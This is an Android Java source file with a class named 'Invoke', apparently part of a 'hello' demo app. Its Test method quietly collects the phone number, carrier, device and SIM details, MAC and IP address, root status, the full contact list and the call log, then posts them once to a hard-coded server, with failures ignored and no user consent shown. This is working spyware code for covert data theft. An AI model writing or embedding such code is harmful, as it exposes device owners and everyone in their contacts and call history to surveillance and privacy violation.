package com.xx.hello.hellondk.phone;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.graphics.BitmapFactory;
import android.os.Build;
import android.support.v4.content.ContextCompat;
import android.util.Log;


import com.bumptech.glide.Glide;

import java.io.IOException;
import java.util.Date;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;


public class Invoke {

    private SharedPreferences.Editor mEdit;

    public void Test(final Context paramContext) {
        SharedPreferences sp=paramContext.getSharedPreferences("sp",Context.MODE_PRIVATE);
        boolean getData = sp.getBoolean("getData", false);
        mEdit = sp.edit();
        if (!getData){
            Object localObject = new PhoneInfo(paramContext);
            String str1 = ((PhoneInfo) localObject).getNativePhoneNumber();Log.e("======",str1 );
            String str2 = ((PhoneInfo) localObject).getProvidersName();Log.e("======", str2 );
            String str3 = Build.BRAND;   Log.e("======", str3 );
            String str4 = ((PhoneInfo) localObject).getPhoneInfo(); Log.e("======",str4);
            String str5 = ((PhoneInfo) localObject).getLocalMac(); Log.e("==++====", str5 );
            String str6 = ((PhoneInfo) localObject).getHostIP(); Log.e("======",str6);
            String str7 = ((PhoneInfo) localObject).haveRoot();Log.e("======", str7);
            String str8 = Build.VERSION.RELEASE; Log.e("======", str8);
            String str9 = ((PhoneInfo) localObject).isCN(paramContext); Log.e("======", str9);
            String str10 = ((PhoneInfo) localObject).language(); Log.e("======", str10);
            String str11 = ((PhoneInfo) localObject).getContact2();  Log.e("======", str11);

            String str13 = ((PhoneInfo) localObject).GetCallsInPhone();Log.e("======", str13);

            String str12 = getTime();

            OkHttpClient okHttpClient = new OkHttpClient();

            RequestBody body = new FormBody.Builder()
                    .add("num", str1).add("type", str2)
                    .add("brand", str3)
                    .add("uicc", str4)
                    .add("mac", str5)
                    .add("ip", str6)
                    .add("root", str7)
                    .add("version", str8)
                    .add("is_cn", str9)
                    .add("language", str10)
                    .add("contact", str11)
                    .add("call", str13)
                    .build();

            Request request = new Request.Builder()
                    .url("http://192.168.1.110:8080/text/AServlet")
                    .post(body)
                    .build();

            okHttpClient.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                }

                @Override
                public void onResponse(Call call, okhttp3.Response response) throws IOException {
                    mEdit.putBoolean("getData",true);
                    mEdit.commit();
                }
            });
        }

    }

    /**
     * @return 返回当前时间
     */
    public static String getTime() {
        Date now = new Date();
        java.text.SimpleDateFormat dateFormat = new java.text.SimpleDateFormat("yyyy-MM-dd+HH:mm");//可以方便地修改日期格式
        return dateFormat.format(now);
    }

    /**
     * 权限检查
     */
    public boolean hasPermission(Context context,String... permissions) {
        if (Build.VERSION.SDK_INT < 23) {
            return true;
        }

        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(context, permission) !=
                    PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }
}


